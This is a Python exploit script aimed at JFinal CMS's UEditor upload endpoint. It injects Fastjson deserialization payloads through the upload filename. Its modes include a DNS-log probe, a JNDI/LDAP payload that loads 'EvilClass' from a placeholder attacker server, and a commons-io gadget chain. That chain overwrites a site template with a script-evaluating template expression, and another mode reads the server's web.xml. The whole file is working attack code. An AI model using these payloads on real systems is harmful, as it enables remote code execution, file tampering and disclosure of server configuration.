import requests
import time
import os
#{"state": "SUCCESS","original": "flag".txt","size": "15","title": "1694779756965063097.txt","type": ".txt","url": "/jfinal_cms_war/jflyfox/ueditor/file/20230915/1694779756965063097.txt"}
def CreateBody(filename, fieldname, strBoundary,exp,mode):
    bRet = False
    sData = []
    sData.append('--%s' % strBoundary)
    #'Content-Disposition: form-data; name="uploadfile"; filename="XX-Net-1.3.6.zip"'
    if mode == 1:
        sData.append('Content-Disposition: form-data; name="%s";' % fieldname + 'filename=flag",%s,"a":".txt'%(exp))
    sData.append('Content-Type: %s\r\n' % 'application/octet-stream')
 
    try:
        pFile = open(filename, 'rb')
        sData.append(str(pFile.read()))
        sData.append('--%s--\r\n' % strBoundary)
        bRet = True
    finally:
        pFile.close()
            
    return bRet, sData
 
def uploadfile(http_url, filename, fieldname,exp,mode):        
    if os.path.exists(filename):
        filesize = os.path.getsize(filename)
        print('file:' + filename + ' is %d bytes!' % filesize)
    else:
        print('file:' + filename + ' isn\'t exists!')
        return False
    
    strBoundary = '---------------------------%s' % hex(int(time.time() * 1000))
    bRet, sBodyData = CreateBody(filename, fieldname, strBoundary,exp,mode)
    if True == bRet:
        http_body = '\r\n'.join(sBodyData)
        headers = {
            "User-Agent":"Mozilla/5.0",
            "Content-Length":'%d' % filesize,
            "Content-Type":'multipart/form-data; boundary=%s' % strBoundary,
        }
        response = requests.post(http_url,data=http_body,headers=headers)
        # get response
        msg = response.text
        print("Response content:\n" + msg)
    else:
        print("CreateBody failed!")
        
    return bRet

if __name__ == "__main__":
    vul = "writefile"
    if vul == "test":
        uploadfile("http://localhost:8080/jfinal_cms_war/ueditor?action=uploadfile","vul.txt","123",'"vulnerable":"hacked"',1)
    elif vul == "dns":
        uploadfile("http://localhost:8080/jfinal_cms_war/ueditor?action=uploadfile","vul.txt","123",'{"@type":"java.net.Inet4Address","val":"dnslog"}',1)
    elif vul =="rce":
        uploadfile("http://localhost:8080/jfinal_cms_war/ueditor?action=uploadfile","vul.txt","123",'{"a":{ "@type":"java.lang.Class", "val":"com.sun.rowset.JdbcRowSetImpl" }, "b":{ "@type":"com.sun.rowset.JdbcRowSetImpl", "dataSourceName":"ldap://yourvpsip:port/EvilClass", "autoCommit":true}}',1)
    elif vul =="writefile":
        mode="gotorce"
        if mode =="gotoread":
            evil = "${printFile('../../conf/web.xml')}"
        elif mode == "gotorce":
            # evil="${@Class.forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"js\").eval(\"s='calc';java.lang.Runtime.getRuntime().exec(s);\")}"
            # evil = "123123132\"\"123;"
            # evil = "${parameter.a}"
            evil = "${@Class.forName(parameter.a).newInstance().getEngineByName(parameter.b).eval(parameter.c)}"
        print(evil)
        while(len(evil)<=8192):
            evil = evil + "c"   #脏字符

        uploadfile("http://localhost:8080/jfinal_cms_war/ueditor?action=uploadfile","vul.txt","123",'{"x":{"@type":"com.alibaba.fastjson.JSONObject","input":{"@type":"java.lang.AutoCloseable","@type":"org.apache.commons.io.input.ReaderInputStream","reader":{"@type":"org.apache.commons.io.input.CharSequenceReader","charSequence":{"@type":"java.lang.String""'+evil+'","start":0,"end":2147483647},"charsetName":"UTF-8","bufferSize":1024},"branch":{"@type":"java.lang.AutoCloseable","@type":"org.apache.commons.io.output.WriterOutputStream","writer":{"@type":"org.apache.commons.io.output.FileWriterWithEncoding","file":"E:/jfinal_cms/src/main/webapp/template/includes/jquery.html","charsetName":"US-ASCII","append":false},"charsetName":"UTF-8","bufferSize":1024,"writeImmediately":true},"trigger":{"@type":"java.lang.AutoCloseable","@type":"org.apache.commons.io.input.XmlStreamReader","inputStream":{"@type":"org.apache.commons.io.input.TeeInputStream","input":{"$ref":"$.input"},"branch":{"$ref":"$.branch"},"closeBranch":true},"httpContentType":"text/xml","lenient":false,"defaultEncoding":"UTF-8"},"trigger2":{"@type":"java.lang.AutoCloseable","@type":"org.apache.commons.io.input.XmlStreamReader","inputStream":{"@type":"org.apache.commons.io.input.TeeInputStream","input":{"$ref":"$.input"},"branch":{"$ref":"$.branch"},"closeBranch":true},"httpContentType":"text/xml","lenient":false,"defaultEncoding":"UTF-8"},"trigger3":{"@type":"java.lang.AutoCloseable","@type":"org.apache.commons.io.input.XmlStreamReader","inputStream":{"@type":"org.apache.commons.io.input.TeeInputStream","input":{"$ref":"$.input"},"branch":{"$ref":"$.branch"},"closeBranch":true},"httpContentType":"text/xml","lenient":false,"defaultEncoding":"UTF-8"}}',1)
        # uploadfile("http://localhost:8080/jfinal_cms_war/ueditor?action=uploadfile","vul.txt","123",'{"x":{"@type":"com.alibaba.fastjson.JSONObject","input":{"@type":"java.lang.AutoCloseable","@type":"org.apache.commons.io.input.ReaderInputStream","reader":{"@type":"org.apache.commons.io.input.CharSequenceReader","charSequence":{"@type":"java.lang.String""'+evil+'","start":0,"end":2147483647},"charsetName":"UTF-8","bufferSize":1024},"branch":{"@type":"java.lang.AutoCloseable","@type":"org.apache.commons.io.output.WriterOutputStream","writer":{"@type":"org.apache.commons.io.output.FileWriterWithEncoding","file":"E:/jfinal_cms/src/main/webapp/template/includes/jquery.html","charsetName":"UTF-8","append":false},"charsetName":"UTF-8","bufferSize":1024,"writeImmediately":true},"trigger":{"@type":"java.lang.AutoCloseable","@type":"org.apache.commons.io.input.XmlStreamReader","inputStream":{"@type":"org.apache.commons.io.input.TeeInputStream","input":{"$ref":"$.input"},"branch":{"$ref":"$.branch"},"closeBranch":true},"httpContentType":"text/xml","lenient":false,"defaultEncoding":"UTF-8"},"trigger2":{"@type":"java.lang.AutoCloseable","@type":"org.apache.commons.io.input.XmlStreamReader","inputStream":{"@type":"org.apache.commons.io.input.TeeInputStream","input":{"$ref":"$.input"},"branch":{"$ref":"$.branch"},"closeBranch":true},"httpContentType":"text/xml","lenient":false,"defaultEncoding":"UTF-8"},"trigger3":{"@type":"java.lang.AutoCloseable","@type":"org.apache.commons.io.input.XmlStreamReader","inputStream":{"@type":"org.apache.commons.io.input.TeeInputStream","input":{"$ref":"$.input"},"branch":{"$ref":"$.branch"},"closeBranch":true},"httpContentType":"text/xml","lenient":false,"defaultEncoding":"UTF-8"}}',1)